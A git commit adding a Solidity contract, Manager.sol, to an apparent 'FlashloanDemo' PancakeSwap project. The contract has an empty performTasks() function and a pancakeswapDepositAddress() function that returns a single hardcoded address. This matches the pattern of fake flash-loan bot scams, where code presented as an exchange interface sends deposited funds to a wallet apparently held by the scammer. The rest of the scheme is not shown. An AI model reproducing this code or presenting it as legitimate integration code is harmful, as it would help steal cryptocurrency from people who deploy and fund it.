ae656775db87afa6a61bf0601277b3d8cdf5b7dd
FlashloanDemo <97288794+FlashloanDemo@users.noreply.github.com>
2022-01-08 01:53:19 -0300

    Create Manager.sol

---
+++ contracts/InterfacePancake/Manager.sol
@@ -0,0 +1,14 @@
+pragma solidity ^0.5.0;
+
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x0c0f8f8DABC7861E0d92cdBCCb0DCC60bC68a114;
+    }
+}
+
+//pancakeswapfunction
